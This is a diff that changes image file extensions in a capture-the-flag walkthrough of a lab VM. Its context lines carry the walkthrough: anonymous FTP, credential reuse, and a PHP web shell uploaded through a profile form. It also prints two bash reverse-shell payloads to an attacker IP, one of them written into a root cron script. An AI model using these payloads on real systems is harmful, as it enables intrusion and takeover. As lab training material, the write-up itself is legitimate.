@@ -38,11 +38,11 @@ now start the target VM and wait for new machine IP entry it will be the IP of o
 
 Before starting the target VM.
 
-![image](/images/md/264f4aa5-62fd-47d0-bb51-88a1fe8211e7.png)
+![image](/images/md/264f4aa5-62fd-47d0-bb51-88a1fe8211e7.webp)
 
 After starting the target VM.
 
-![image](/images/md/48ec1846-d9e4-4f40-a996-91b68db451f8.png)
+![image](/images/md/48ec1846-d9e4-4f40-a996-91b68db451f8.webp)
 
 
 Now that we have the target IP `192.168.0.113` let's run the `nmap`.
@@ -96,9 +96,9 @@ Here we see that port `21,22,80` are open.
 In port 21 Anonymous FTP login is allowed  \
 to see what files are present in this ftp we can open `ftp://192.168.0.113/` in windows File Explorer or we can also use curl
 
-![image](/images/md/94033cfd-6173-49d2-bc31-18b3621d137f.png)
+![image](/images/md/94033cfd-6173-49d2-bc31-18b3621d137f.webp)
 
-![image](/images/md/8028de5e-668e-4123-8aef-42e27cb07c85.png)
+![image](/images/md/8028de5e-668e-4123-8aef-42e27cb07c85.webp)
 
 
 The note says `The StudentRegno number is what you use for login` which is `10201321` and
@@ -110,7 +110,7 @@ now we have login credentials `10201321:student` note this for now and let's mov
 
 `http://192.168.0.113/` is Apache2 Debian Default Page.
 
-![image](/images/md/d0094763-f520-4028-a338-0aca0d6cb604.png)
+![image](/images/md/d0094763-f520-4028-a338-0aca0d6cb604.webp)
 
 
 There is nothing much to see in this default page so let's do the directory brute force.
@@ -141,12 +141,12 @@ Task Completed
 
 We found the `/phpmyadmin/` and `/academy/` directories on the `http://192.168.0.113/academy/` page we have one login form.
 
-![image](/images/md/8dcd96ba-f63a-4524-9ea6-95156c8ce0df.png)
+![image](/images/md/8dcd96ba-f63a-4524-9ea6-95156c8ce0df.webp)
 
 
 Let's try the login credentials `10201321:student` that we found previously from ftp note.
 
-![image](/images/md/a36b56d4-987e-4e97-834f-f1f0fc105bf4.png)
+![image](/images/md/a36b56d4-987e-4e97-834f-f1f0fc105bf4.webp)
 
 
 It worked we are now logged in. \
@@ -154,39 +154,39 @@ On the My Profile page we have file upload functionality.
 
 try uploading simple php shell `<?php system($_REQUEST['cmd']); ?>` and it is not blocked we now have the ability to execute commands on server.
 
-![image](/images/md/08e0c9d1-2522-4e8a-9fc3-4a19c13bc969.png)
+![image](/images/md/08e0c9d1-2522-4e8a-9fc3-4a19c13bc969.webp)
 
 
 we can get reverse shell by this payload `cmd=bash+-c+"bash+-i+>%26+/dev/tcp/192.168.0.207/9001+0>%261"` \
 reference: https://www.revshells.com
 
-![image](/images/md/4dc9b13a-e0a3-4ff4-82fd-5a32fb2b0270.png)
+![image](/images/md/4dc9b13a-e0a3-4ff4-82fd-5a32fb2b0270.webp)
 
-![image](/images/md/4cf54a48-a797-4c62-ae47-f0e3a7fa91a5.png)
+![image](/images/md/4cf54a48-a797-4c62-ae47-f0e3a7fa91a5.webp)
 
 
 In the config.php file we have the mysql_password `My_V3ryS3cur3_P4ss` and in the ftp note we show line `I told him not to use the same password everywhere` which implies 
 that user Grimmie is reusing the same password so we can try to use this password to switch to user Grimmie.
 
-![image](/images/md/a6efd8be-7132-4ee9-86b2-b44bcb917ba6.png)
+![image](/images/md/a6efd8be-7132-4ee9-86b2-b44bcb917ba6.webp)
 
 
 looking at crontab we notice that `/home/grimmie/backup.sh` file is running as root and we can modify this file to get root access.
 
-![image](/images/md/ee82ccab-380c-485d-855c-247e8e2e7dcc.png)
+![image](/images/md/ee82ccab-380c-485d-855c-247e8e2e7dcc.webp)
 
 
 Reverse shell payload to get shell as root: 
 
 `echo 'bash -c "bash -i >& /dev/tcp/192.168.0.207/9002 0>&1"' > backup.sh`
 
-![image](/images/md/0c2c4b55-7951-4637-ab07-86077b1ce395.png)
+![image](/images/md/0c2c4b55-7951-4637-ab07-86077b1ce395.webp)
 
-![image](/images/md/b1a801aa-7b03-4d4d-849a-6a7532c95b22.png)
+![image](/images/md/b1a801aa-7b03-4d4d-849a-6a7532c95b22.webp)
 
 
 Flag:
 
-![image](/images/md/50dbf9b2-9236-4656-95ff-e7747b222a6c.png)
+![image](/images/md/50dbf9b2-9236-4656-95ff-e7747b222a6c.webp)
 
 Happy Hacking
